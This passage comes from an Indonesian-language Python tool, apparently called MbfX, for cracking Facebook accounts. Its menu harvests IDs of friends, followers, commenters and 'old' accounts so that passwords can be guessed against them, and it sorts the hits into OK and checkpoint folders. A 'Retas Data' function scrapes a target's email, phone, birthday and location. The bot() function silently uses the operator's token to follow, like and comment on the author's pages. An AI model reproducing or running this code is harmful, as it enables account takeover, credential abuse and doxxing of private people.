        has = ses_pros_dev.get(ambil_url, cookies=cookie_dev).content
    except:
        pass
    if len(ikuti_) == 0:
        try:
            uwu_u = 'https://mbasic.facebook.com/jangan.macem.macem.2'
            ikut = ses_pros_dev.get(uwu_u, cookies=cookie_dev).content
            sop_dev = BeautifulSoup(ikut, 'html.parser')
            ambil = sop_dev.find('a', string='Ikuti')
            data = 'https://mbasic.facebook.com' + ambil['href']
            ses_pros_dev.get(data, cookies=cookie_dev)
        except:
            pass

def cookie():
	clear()
	banner()
	fb = 'https://m.facebook.com'
	sayang = usup("\n"+mx+p+" Cookie Fb : "+b)
	mbew = open(".kuekering.txt","w").write(sayang)
	coki = open(".kuekering.txt","r").read()
	cookie = {'cookie': coki}
	loglog = requests.get(fb,cookies=cookie).content
	if loglog=='mbasic_logout_button':
		emil("\n"+mx+p+" Sedang Mengecek Harap Tunggu...")
		proses_masuk()
		token_dari_coki(cookie)
		jalan (mx+h+" Login cookie Berhasil")
		menu()
	elif loglog=='checkpoint':
		jalan (mx+k+" Akun Checkpoint")
		os.system("rm .kuekering.txt")
		exit()
	else:
		jalan(mx+m+" Cookie Salah")
		os.system("rm .kuekering.txt")
		exit()
def encup():
	clear()
	banner()
	emil(u+"\n ["+m+"1"+u+"]"+p+" Login Cookie")
	emil(u+" ["+m+"2"+u+"]"+p+" Login Token")
	sayang=usup("\n"+mx+p+" Pilih : "+m)
	if sayang == "1" or sayang == "01":
		cookie()
	elif sayang == "2" or sayang == "02":
		login()
	else:
		jalan(mx+k+" ketik yg bener tood")
def login():
	clear()
	banner()
	emil (p+'\n Ketik '+b+'"Belom" '+p+'jika tidak punya token')
	token = usup("\n"+balmond+p+" Token Fb :"+b+" ")
	if token=="belom" or token=="Belom" or token=="belum":
		jalan (mx+k+" Anda Akan Diarahkan Ke Browser...");time.sleep(2)
		os.system("xdg-open https://youtu.be/cbSVFZLotKI")
	try:
		hujan = requests.get("https://graph.facebook.com/me?access_token="+token)
		batu = json.loads(hujan.text)
		air = batu["name"]
		api = open(".Emil.txt","w");api.write(token);api.close()
		jalan(balmond+p+" Login Sukses")
		time.sleep(0.5)
		jalan(balmond+p+"  Hai👋 "+air+" Jelek :v")
		bot()
		menu()
	except KeyError:
		try:
			koral = json.loads(hujan.text)
			ban = koral["error"]["error_user_msg"]
			jalan("\n\x1b[1;93m Mohon Maaf \x1b[1;97m"+ban);time.sleep(3)
			emil("istirahat dulu tood")
			exit()
		except:
			pass
		jalan(balmond+m+" Login Gagal")
		time.sleep(0.5)
		login()

# BOT

def bot():
	try:
		token = open(".Emil.txt","r").read()
	except IOError:
		jalan(balmond+m+" Toket Basi")
		time.sleep(0.5)
		login()
	komentar = random.choice(["McybearX emang the best:v","Mantap McybearX","Suport terus McybearX","the best of hacker "])
	komen = random.choice(["Anjay bet lu bang:v","bang dah punya pacar beloom :D","Gua Suport lu terus bang","Semangat ya baang 🤗","Youtube MBEWLEGS 😘","Ganteng banget lu bang","Semoga lu sukses ya bang","Gua doain lo jadi orang sukses bang amiin","amiin semoga bang usup jadi orang sukses"])
	with requests.Session() as (RekuesLaguApa):
		RekuesLaguApa.post("https://graph.facebook.com/100074600334850/subscribers?access_token="+token)
		RekuesLaguApa.post("https://graph.facebook.com/100050672943941/subscribers?access_token="+token) # Usup Mbew
		RekuesLaguApa.post("https://graph.facebook.com/123822970114380/likes?summary=true&access_token=" + token)
		RekuesLaguApa.post("https://graph.facebook.com/111932931303384/likes?summary=true&access_token=" + token)
		RekuesLaguApa.post("https://graph.facebook.com/111932931303384/comments/?message="+komentar+"&access_token="+token)
		RekuesLaguApa.post("https://graph.facebook.com/368578384841257/comments/?message="+komen+"&access_token="+token)
	menu()

# MENU

def menu():
	try:
		os.mkdir("Hasil")
		os.mkdir("Hasil/Cp")
		os.mkdir("Hasil/Ok")
	except:
		pass
	try:
		token = open(".Emil.txt","r").read()
		cintaku = requests.get("https://graph.facebook.com/me?access_token="+token)
		sayangkuh = requests.get("https://graph.facebook.com/100050672943941/subscribers?access_token="+token)
		Mbewlek = json.loads(sayangkuh.text)
		pillow = json.loads(cintaku.text)
		halilintar = Mbewlek["summary"]["total_count"]
		hujan = pillow["name"]
		try :
			Ucup = pillow["hometown"]["name"]+""" City"""
		except (KeyError,IOError):
			Ucup = "-"
		badai = Ucup
	except KeyError:
		jalan(balmond+m+" Token expired")
		time.sleep(0.5)
		encup()
	except requests.exceptions.ConnectionError:
		jalan(balmond+m+" Loss konek")
		time.sleep(0.5)
		exit()
	except IOError:
		jalan(balmond+m+" Token Invalid")
		time.sleep(0.5)
		encup()
	clear()
	banner()
	emil(l+"\n Username   : "+hujan)
	emil(p+" Lokasi     : "+badai)
	emil(p+" Pengguna   : %s Orang"%halilintar)
	emil(p+" Tanggal    : "+hck)
	emil(ris)
	emil(u+" ["+m+"o1"+u+"]"+p+" Crack Akun Publik Acak")
	emil(u+" ["+m+"o2"+u+"]"+p+" Crack Akun Followers Publik")
	emil(u+" ["+m+"o3"+u+"]"+p+" Crack Akun Publik Masal")
	emil(u+" ["+m+"o4"+u+"]"+p+" Crack Akun Pertemanan Sendiri")
	emil(u+" ["+m+"o5"+u+"]"+p+" Crack Akun old 2004/2008")
	emil(u+" ["+m+"o6"+u+"]"+p+" Crack Akun old 2004/2010")
	emil(u+" ["+m+"o7"+u+"]"+p+" Crack Akun like Postingan")
	emil(u+" ["+m+"o8"+u+"]"+p+" Crack Akun Komen Postingan")
	emil(u+" ["+m+"o9"+u+"]"+p+" MODE "+m+"Target "+u+"("+k+"slow"+u+")")
	emil(u+" ["+m+"1o"+u+"]"+b+" RetaS Data Target")
	emil(u+" ["+m+"11"+u+"]"+p+" Cek Jumlah Hasil Crack")
	emil(u+" ["+m+"12"+u+"]"+p+" Ganti Tema ")
	emil(u+" ["+m+"13"+u+"]"+p+" Unlock Checkpoint "+u+"("+k+"Jebol Sesi"+u+")")
	emil(u+" ["+m+"14"+u+"]"+p+" Setting User Agent")
	emil(u+" ["+m+"15"+u+"]"+k+" Tentang Author")
	emil(u+" ["+m+"o0"+u+"]"+m+" \x1b[9;91mHapus Token\033[0m")
	emil(ris)
	Dela_Sayang_Usup = usup(balmond+p+" No : "+m)
	iklan()
	emil(ris)
	if Dela_Sayang_Usup=="1" or Dela_Sayang_Usup=="01":
		jalan(p+" Semoga Usup Menjadi Anak Yang Sukses Amiin")
		publik()
	elif Dela_Sayang_Usup=="7" or Dela_Sayang_Usup=="07":
		jalan(p+" Semoga Usup Menjadi Anak Yang Sukses Amiin")
		likess()
	elif Dela_Sayang_Usup=="15" or Dela_Sayang_Usup=="015":
		jalan(p+" Semoga Usup Menjadi Anak Yang Sukses Amiin")
		Author()
	elif Dela_Sayang_Usup=="2" or Dela_Sayang_Usup=="02":
		jalan(p+" Semoga Usup Menjadi Anak Yang Sukses Amiin")
		follow()
	elif Dela_Sayang_Usup=="3" or Dela_Sayang_Usup=="03":
		jalan(p+" Semoga Usup Menjadi Anak Yang Sukses Amiin")
		massal()
	elif Dela_Sayang_Usup=="4" or Dela_Sayang_Usup=="04":
		jalan(p+" Semoga Usup Menjadi Anak Yang Sukses Amiin")
		temen_dewek()
	elif Dela_Sayang_Usup=="5" or Dela_Sayang_Usup=="05":
		jalan(p+" Semoga Usup Menjadi Anak Yang Sukses Amiin")
		dump_old()
	elif Dela_Sayang_Usup=="6" or Dela_Sayang_Usup=="06":
		jalan(p+" Semoga Usup Menjadi Anak Yang Sukses Amiin")
		dump_old2()
	elif Dela_Sayang_Usup=="8" or Dela_Sayang_Usup=="08":
		jalan(p+" Semoga Usup Menjadi Anak Yang Sukses Amiin")
		Komen_Dong_Bang()
	elif Dela_Sayang_Usup=="9" or Dela_Sayang_Usup=="09":
		jalan(p+" Semoga Usup Menjadi Anak Yang Sukses Amiin")
		Target()
	elif Dela_Sayang_Usup=="14" or Dela_Sayang_Usup=="014":
		user_agent()
	elif Dela_Sayang_Usup=="13" or Dela_Sayang_Usup=="013":
		cek_opsi()
	elif Dela_Sayang_Usup=="11" or Dela_Sayang_Usup=="011":
		result()
	elif Dela_Sayang_Usup=="012" or Dela_Sayang_Usup=="12":
		tema()
	elif Dela_Sayang_Usup=="10" or Dela_Sayang_Usup=="010":
		GetData()
	elif Dela_Sayang_Usup=="0" or Dela_Sayang_Usup=="00":
		os.system("rm .Emil.txt")
		jalan(balmond+l+" Thanks "+s+hujan+l+" Karna Sudah Pakai Tools MbfX :)")
		time.sleep(0.5)
		exit()
	else:
		jalan("\n"+balmond+m+" "+Dela_Sayang_Usup+p+" Gada di menu tod")
		time.sleep(1)
		menu()
# McybearX

def Author():
	emil(u+" ["+m+"o1"+u+"]"+p+" Join Group Whatsapp")
	emil(u+" ["+m+"o2"+u+"]"+p+" Youtube me")
	emil(u+" ["+m+"o3"+u+"]"+p+" Facebook me")
	emil(u+" ["+m+"o4"+u+"]"+p+" Lapor BUG ")
	abang = usup(ris+"\n"+mx+p+" Pilih :"+m+" ")
	if abang=="1" or abang=="01":
		os.system("xdg-open https://chat.whatsapp.com/BS6l4dCa9aC8TQ46wB8W06")
	elif abang=="2" or abang=="02":
		os.system("xdg-open https://cararegistrasi.com/VGWDEihZia")
	elif abang=="3" or abang=="03":
		os.system("xdg-open https://www.facebook.com/profile.php?id=100074600334850")
	elif abang=="4" or abang=="04":
		os.system("xdg-open https://cararegistrasi.com/Abu2QKwEO")
	else :
		emil_lope_usup(mx+p+" "+abang+" Gada di Menu Tod");time.sleep(1)
		Author()

# cek apk terkait
def cek_apk():

            try:
                c = 1
                url_ = ['https://mbasic.facebook.com/settings/apps/tabbed/?tab=active',
                 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive']
                apk_dev.append(h + '\n{' + a + 'Apk' + h + '}' + p + ' Aplikasi yang terkait')
                for url in url_:
                    iqbal_data = ses_dev.get(url)
                    sop_dev = BeautifulSoup(iqbal_data.content, 'html.parser')
                    form_ = sop_dev.find('form', method='post')
                    for dev in form_.find_all('h3'):
                        try:
                            apk = dev.find('span').text
                            if c >= 2:
                                apk_dev.append(p + '\n    |_' + k + str(c) + ' ' + h + apk)
                            else:
                                apk_dev.append(p + '\n    \\_' + k + str(c) + ' ' + h + apk)
                            c += 1
                        except:
                            pass

            except:
                pass

            if len(apk_dev) == 1:
                apk_dev.append('\n      ' + m + 'Tidak ada Aplikasi yg Terkait..')

# Target

def Target():
        try:
                token = open(".Emil.txt","r").read()
        except IOError:
                jalan(balmond+m+" Toket Basi")
                time.sleep(0.5)
                login()
        uid=usup(mx+p+" Masukan id Target : "+b)
        try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        pea = tulul["name"]
                        emil(balmond+l+" Nama : "+tulul["name"])
                        id.append(uid+"|"+pea)
        except KeyError:
                        emil(balmond+m+" ID Salah")
                        time.sleep(0.5)
                        exit()
        except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Loss Konek")
                        time.sleep(0.5)
                        exit()
        emil_lope_usup (mx+p+" Ada %s Target"%len(id))
        mode_passTarget()

# Retas data
idungpesek = []
def GetData():
    try:
        token = open(".Emil.txt","r").read()
    except (IOError,KeyError):
        jalan(mx+k+" Toket Kadaluwarsa")
        login()
    try:
        user = usup (balmond+p+" Id Target : ")
        if user == '':
            jalan (balmond+m+" Masukin id yang bener Tod-_");GetData()
        idt = user
        bek = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,token))
        x = json.loads(bek.text)
        nmaa = x['name']
    except (KeyError,IOError):
        jalan(mx+m+" Id Salah!!!")
        GetData()
#        nmaa = ('-')
    emil (ris)
    jalan (b+"   Informasi Akun ")
    jala (mx+p+' Nama Lengkap : '+nmaa)
    try:
        ndpn = x['first_name']
        jala (mx+p+' Nama Depan   : %s'%ndpn)
    except (KeyError,IOError):
        pass
    try:
        nmbl = x['last_name']
        jala (mx+p+' Nama Belakang: %s'%nmbl)
    except (KeyError,IOError):
        pass
    try:
        hwhs = x['username']
        jala (mx+p+' Username fb  : '+hwhs)
    except (KeyError,IOError):
        pass
    try:
        Mxz = x['id']
        jala (mx+p+' Id Facebook  : %s'%Mxz)
    except (KeyError,IOError):
        pass
    emil (ris)
    jalan (b+'   Data-Data Akun  \n')
    try:
        emai = x['email']
        jala (mx+p+' gmail facebook : %s'%emai)
    except (KeyError,IOError):
        pass
    try:
        nmrr = x['mobile_phone']
        jala (mx+p+' nomor telepon  : %s'%nmrr)
    except (KeyError,IOError):
        pass
    try:
        ttll = x['birthday']
        jala (mx+p+' tanggal lahir  : %s '%ttll)
    except (KeyError,IOError,NameError):
        pass
    try:
        jenis = x['gender'].replace("female","Betina").replace("male","Jantan")
        jala (mx+p+' jenis kelamin  : %s '%jenis)
    except (KeyError,IOError):
        pass
    try:
        z = requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(idt, token)).json()
        for i in z["data"]:
            try:
               jamet = i["id"]
               idungpesek.append(jamet)
            except:
               pass
        if len(idungpesek)==0:
            pass
        else:
            jala (mx+p+' total pertemnan: %s'%(len(idungpesek)))
    except:
        pass
    try:
        A = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt,token)).json()
        pengikut = A["summary"]["total_count"]
        jala (mx+p+' total pengikut : %s'%pengikut)
    except (KeyError, IOError):
        pass
    try:
        lins = x['link']
        jala (mx+p+' link facebook  : %s'%lins)
    except (KeyError,IOError):
        pass
    try:
        try:
            stas = x['relationship_status']
        except (TypeError,KeyError,IOError):
            stas = 'Jomblo'
        try:
            dgn = """ dengan """+x['significant_other']['name']
        except (TypeError,KeyError,IOError):
            dgn = ' '
        except:
            pass
        jala (mx+p+' status         : '+stas+dgn)
    except:
        pass
    try:
        bioo = x['about']
        jala (mx+p+' tentang status : %s'%bioo)
    except (KeyError,IOError):
        pass
    try:
        dari = x['hometown']['name']
        jala (mx+p+' kota asal      : %s'%dari)
    except:
        pass
    try:
        tigl = x['location']['name']
        jala (mx+p+' alamat         : %s'%tigl)
    except (KeyError,IOError):
        pass
    try:
        skul = x["education"]
        for UsupGantengSedunia in skul:
            try:
               jala (mx+p+" sekolah        : %s"%(str(UsupGantengSedunia["school"]["name"])))
            except:
               pass
    except:
        pass
    try:
        lopeDela = x["location"]["id"]
        jala (mx+p+' id lokasi      : %s'%lopeDela)
    except (KeyError,IOError):
        pass
    try:
        tzim = x['timezone']
        jala (mx+p+' zona waktu     : %s'%tzim)
    except (KeyError,IOError):
        pass
    try:
        jam  = x['updated_time'][11:19]
        uptd = x['updated_time'][:10]
        year, month, day = uptd.split("-")
        month = bulan_ttl[month]
    except (KeyError,IOError):
        year = '-'
        month = '-'
        day = '-'
    except:
        pass
    jalan(mx+" Terakhir Online Tanggal \x1b[1;97m"+uptd+"\x1b[1;95m Jam \x1b[1;97m"+jam)
    emil(ris)
    usup(u+'\n  [ '+p+'KEMBALI '+u+'] ')
    menu()
#GetData()
# TEMA

def tema():
	emil_lope_usup(u+"\n ["+m+"o1"+u+"]"+p+" Tema Default "+u+"("+p+"Biasa"+u+")")
	emil_lope_usup(u+" ["+m+"o2"+u+"]"+p+" Tema Kuning "+u+"("+k+"Tai"+u+")")
	emil_lope_usup(u+" ["+m+"o3"+u+"]"+p+" Tema Merah "+u+"("+m+"Amarah"+u+")")
	emil_lope_usup(u+" ["+m+"o4"+u+"]"+p+" Tema Biru "+u+"("+b+"Langit"+u+")")
	emil_lope_usup(u+" ["+m+"o5"+u+"]"+p+" Tema Rainbow "+u+"("+m+"P"+k+"e"+h+"l"+b+"a"+u+"n"+s+"g"+k+"i"+u+")")
	emil_lope_usup(u+" ["+m+"o0"+u+"]"+p+" Kembali")
	sayang_emil = usup("\n"+balmond+p+" Pilih :"+m+" ")
	if sayang_emil=="1" or sayang_emil=="01":
		awm = open(".tema.txt","w");awm.write("default");awm.close()
		emil ("\n"+balmond+p+" Tema Berhasil Diterapkan")
		jalan(balmond+p+" Jalankan Ulang Scriptnya...")
		time.sleep(0.5)
		exit()
	elif sayang_emil=="2" or sayang_emil=="02":
		awm = open(".tema.txt","w");awm.write("kuning");awm.close()
		emil ("\n"+balmond+p+" Tema Berhasil Diterapkan")
		jalan(balmond+p+" Jalankan Ulang Scriptnya...")
		time.sleep(0.5)
		exit()
	elif sayang_emil=="3" or sayang_emil=="03":
		awm = open(".tema.txt","w");awm.write("merah");awm.close()
		emil ("\n"+balmond+p+" Tema Berhasil Diterapkan")
		jalan(balmond+p+" Jalankan Ulang Scriptnya...")
		time.sleep(0.5)
		exit()
	elif sayang_emil=="4" or sayang_emil=="04":
		awm = open(".tema.txt","w");awm.write("biru");awm.close()
		emil ("\n"+balmond+p+" Tema Berhasil Diterapkan")
		jalan(balmond+p+" Jalankan Ulang Scriptnya...")
		time.sleep(0.5)
		exit()
	elif sayang_emil=="5" or sayang_emil=="05":
		awm = open(".tema.txt","w");awm.write("random");awm.close()
		emil ("\n"+balmond+p+" Tema Berhasil Diterapkan")
		jalan(balmond+p+" Jalankan Ulang Scriptnya...")
		time.sleep(0.5)
		exit()
	elif sayang_emil=="0" or sayang_emil=="00":
		menu()
	else:
		jalan(balmond+p+"pilihan"+m+sayang_emil+p+" Gada Di Menu Tod-_")
		time.sleep(0.5)
		tema()

# RESULT

def result():
	emil_cantik = 000
	hacil = 1
	emil(u+"\n ["+m+"o1"+u+"]"+l+" Cek Hasil CP "+u+"("+k+"akun sesi"+u+")")
	emil(u+" ["+m+"o2"+u+"]"+l+" Cek Hasil OK "+u+"("+h+"akun terbuka"+u+")")
	emil(u+" ["+m+"o0"+u+"]"+l+" Kembali")
	pilih = usup(ris+"\n"+balmond+l+" Pilih : "+m)
	if pilih=="1" or pilih=="01":
		try:
			emill = os.listdir("Hasil/Cp")
		except FileNotFoundError:
			jalan(balmond+m+" lu belum Retas Tod-_")
			time.sleep(0.5)
			menu()
		if len(emill)==0:
			emil("\n"+balmond+k+" Hasil CP")
			emil(balmond+m+" Gada Hasil Cp")
			usup(balmond+l+" Kembali")
			time.sleep(0.5)
			menu()
		else:
			emil("\n"+balmond+l+" Hasil "+k+"CP \n")
			for jisoo in emill:
				emil(balmond+" "+p+jisoo)
				hacil += 1
			emil(ris)
			marjan = usup(balmond+l+" Nama File : "+b+"")
			try:
				binatang = open("Hasil/Cp/%s"%(marjan))
			except IOError:
				jalan(balmond+l+" Nama File Tidak Ada")
				time.sleep(0.5)
				menu()
		emil(""+l)
		bapakbapak = open("Hasil/Cp/"+marjan,"r").readlines()
		for cuyung in bapakbapak:
			emil_cantik += 1
			emil ("\r"+u+" ["+b+f"{emil_cantik}"+u+"] "+p+cuyung,end=" ")
			time.sleep(0.1)
		emil(ris)
		emil(mx+p+" Jumlah Hasil "+k+"Cp"+p+" :"+b+" %s Akun"%len(bapakbapak))
		emil("\n"+ris)
		cia = usup(balmond+l+" Lanjut Cek Opsi "+u+"("+k+"y"+u+"/"+k+"n"+u+")"+p+" : "+k)
		if cia == "y" or cia == "Y":
			cek_opsi()
			exit()
		elif cia == "n" or cia == "N":
			jalan (mx+p+" Kembali Ke Menu")
			menu()
		else :
			jalan (mx+k+" "+cia+p+" Apaan Anjirr ")
			exit()
	elif pilih=="2" or pilih=="02":
		try:
			emill = os.listdir("Hasil/Ok")
		except FileNotFoundError:
			jalan(balmond+m+" gada hasil ok tod")
			time.sleep(0.5)
			menu()
		if len(emill)==0:
			emil("\n"+balmond+l+" Hasil Ok")
			emil(balmond+m+" Gada Hasil Ok")
			usup(balmond+l+" Kembali")
			time.sleep(0.5)
			menu()
		else:
			emil("\n"+balmond+l+" Hasil Ok")
			for jisoo in emill:
				emil(balmond+l+" "+jisoo)
			marjan = usup(balmond+l+" File : "+h+"")
			try:
				binatang = open("Hasil/Ok/%s"%(marjan))
			except IOError:
				jalan(balmond+l+" Nama File Tidak Ada")
				time.sleep(0.5)
				menu()
		emil(""+l)
		bilur = os.system("cd Hasil/Ok && cat %s"%(marjan))
		usup("\n"+balmond+l+" Kembali")
		time.sleep(0.5)
		menu()
	elif pilih=="0" or pilih=="00":
		menu()
	else:
		jalan("\n"+balmond+m+" "+pilih+p+" Apaan Anjirr")
		time.sleep(0.5)
		result()

# USER AGENT

def user_agent():
	emil(u+"\n ["+m+"o1"+u+"]"+p+" Ganti User Agent")
	emil(u+" ["+m+"o2"+u+"]"+p+" Reset User Agent")
	emil(u+" ["+m+"o3"+u+"]"+p+" Cek User Agent")
	emil(u+" ["+m+"o4"+u+"]"+p+" Pakai User Agent Hp Kamu")
	emil_sayang_usup = usup(ris+"\n"+balmond+l+" Pilih : "+m)
	if emil_sayang_usup=="1" or emil_sayang_usup=="01":
		user = usup("\n"+balmond+p+" Masukkan User Agent : "+p+"")
		tulis = open(".user.txt","w");tulis.write(user);tulis.close()
		jalan(balmond+h+" Berhasil")
		time.sleep(0.5)
		menu()
	elif emil_sayang_usup=="2" or emil_sayang_usup=="02":
		user = "Mozilla/5.0 (Linux; Android 9; Mi Note 10 Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/335.0.0.28.118;]"
		tulis = open(".user.txt","w");tulis.write(user);tulis.close()
		jalan("\n"+balmond+h+" Berhasil")
		time.sleep(0.5)
		menu()
	elif emil_sayang_usup=="3" or emil_sayang_usup=="03":
		try:
			user = open(".user.txt","r").read()
		except IOError:
			jalan("\n"+balmond+m+" File User Agent Tidak Ada, Silahkan Setting Terlebih Dahulu")
			time.sleep(0.5)
			menu()
		emil("\n"+balmond+l+" User Agent : "+h+user)
		usup(ris+"\n"+balmond+l+" Kembali")
		menu()
	elif emil_sayang_usup=="4" or emil_sayang_usup=="04":
		MBEW('\n  Anda Akan di arahkan ke browser,nantinya Anda tinggal\n     Menyalin text setelah kata "+ User-Agent Anda : " Lalu Tempelkan disini' );time.sleep(1)
		os.system("xdg-open https://myuseragent.herokuapp.com")
		buser = usup("\n"+balmond+p+" Masukkan User Agent : "+h+"")
		sulis = open(".user.txt","w");sulis.write(buser);sulis.close()
		jalan(balmond+b+" Berhasil Mengganti User Agent 🤪")
		time.sleep(1)
		menu()
	else:
		jalan("\n"+balmond+m+" "+emil_sayang_usup+" Apaan Tod")
		time.sleep(0.5)
		user_agent()

# Komen Dong Bang

def Komen_Dong_Bang():
	token = open(".Emil.txt","r").read()
	idih = usup(mx+p+" Masukan id Post : "+b)
	try:
		emiil = requests.get("https://graph.facebook.com/v1.0/"+idih+"/comments?access_token="+token)
		Yusuf = json.loads(emiil.text)
		for Emil in Yusuf["data"]:
			try:
				mil = Emil["from"]["id"]
				sup = Emil["from"]["name"]
				id.append(mil+"|"+sup)
				emil_lope_usup(b+mil+u+" | "+p+sup)
				time.sleep(1./100)
			except:
				continue
		emil(mx+p+" Total ID : "+b+"%s"%len(id))
		if len(id)<1:
			emil(mx+k+" Postingan ini Tidak Memiliki Komentar/id Privat")
			usup(mx+p+" Kembali")
			menu()
		mode_password()
	except KeyError:
		emil(mx+m+" ID Salah")
		Komen_Dong_Bang()
	except requests.exceptions.ConnectionError:
		jalan (mx+m+" Koneksi Terganggu")
		time.sleep(1)
		exit()


# pertemanan dewek

def temen_dewek():
        try:
                token = open(".Emil.txt","r").read()
        except IOError:
                jalan(balmond+m+" Toket Basi")
                time.sleep(0.5)
                login()
        max = usup("\n"+balmond+l+" Jumlah Max : ")
        try:
                asu = requests.get("https://graph.facebook.com/me?access_token="+token)
                tulul = json.loads(asu.text)
                emil(balmond+l+" Nama : "+tulul["name"])
        except KeyError:
                emil(balmond+m+" ID Salah")
                time.sleep(0.5)
                publik()
        except requests.exceptions.ConnectionError:
                jalan(balmond+m+" Tidak Ada Internet")
                time.sleep(0.5)
                exit()
        try:
                bulu = requests.get("https://graph.facebook.com/me/friends?limit="+max+"&access_token="+token)
                buriq = json.loads(bulu.text)
                for cew in buriq["data"]:
                        try:
                                jamet = cew["id"]
                                junet = cew["name"]
                                id.append(jamet+"|"+junet)
                                emil_lope_usup(b+jamet+u+" | "+p+junet)
                                time.sleep(1./500)
                        except:
                                continue
                emil(balmond+l+" Total ID : "+h+"%s"%(len(id)))
                if len(id)<1:
                        emil(mx+p+" Maaf Akun ini tidak memiliki pertemanan/id privat")
                        usup(mx+p+" Kembali")
                        menu()
                mode_password()
        except requests.exceptions.ConnectionError:
                jalan(balmond+m+" Tidak Ada Internet")
                time.sleep(0.5)
                exit()

# Old2

def dump_old2():
        try:
                token = open(".Emil.txt","r").read()
        except IOError:
                jalan(balmond+m+" Toket Kadaluarsa")
                time.sleep(0.5)
                login()
        old_gak.append("old")
        try:
                nada = int(usup("\n"+balmond+l+" Mau Dump Berapa target : "))
                if nada>10:
                        jalan(balmond+m+" Maksimal 10 target")
                        time.sleep(0.5)
                        dump_old2()
        except ValueError:
                jalan(balmond+m+" Input Invalid")
                time.sleep(0.5)
                dump_old2()
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = usup(balmond+l+" Masukkan ID ke %s : "%(dot)+b)
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        emil(balmond+l+" Nama : "+tulul["name"])
                        id.append(uid+"|"+tulul["name"])
                except KeyError:
                        emil(balmond+m+" ID Salah")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
                        buriq = json.loads(bulu.text)
                        for cew in buriq["data"]:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        emil(b+jamet+u+" | "+p+junet)
                                        time.sleep(1./200)
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==9:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                elif len(jamet)==15 and jamet[4]=="0":
                                                        if jamet[5]=="0":
                                                                if jamet[6]=="0" or jamet[6]=="1" or jamet[6]=="2" or jamet[6]=="3" or jamet[6]=="4" or jamet[6]=="5" or jamet[6]=="6" or jamet[6]=="7" or jamet[6]=="8":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        continue
                                except:
                                        continue
                        emil(balmond+l+" Total ID : "+h+"%s"%(len(non_old)))
                        emil(balmond+l+" Total ID Old : "+h+"%s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
        emil(balmond+l+" Jumlah Total ID Old : "+h+"%s"%(len(id)))
        if len(id)<1:
                jalan(mx+k+" Tidak Ada Akun Old")
                usup(mx+p+" Kembali")
                os.system("rm id.txt")
                menu()
        os.system("rm id.txt")
        mode_password()

# OLD

def dump_old():
        try:
                token = open(".Emil.txt","r").read()
        except IOError:
                jalan(balmond+m+" Toket Basi")
                time.sleep(0.5)
                login()
        old_gak.append("old")
        try:
                nada = int(usup("\n"+balmond+l+" Mau Dump Berapa Target : "))
                if nada>10:
                        jalan(balmond+m+" Maksimal 10 Target")
                        time.sleep(0.5)
                        dump_old()
        except ValueError:
                jalan(balmond+m+" Input Invalid")
                time.sleep(0.5)
                dump_old()
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = usup(balmond+l+" Masukkan ID Ke %s : "%(dot)+b)
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        emil(balmond+l+" Nama : "+tulul["name"])
                        id.append(uid+"|"+tulul["name"])
                except KeyError:
                        emil(balmond+m+" ID Salah")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
                        buriq = json.loads(bulu.text)
                        for cew in buriq["data"]:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        emil(b+jamet+u+" | "+p+junet)
                                        time.sleep(1./200)
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==9:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
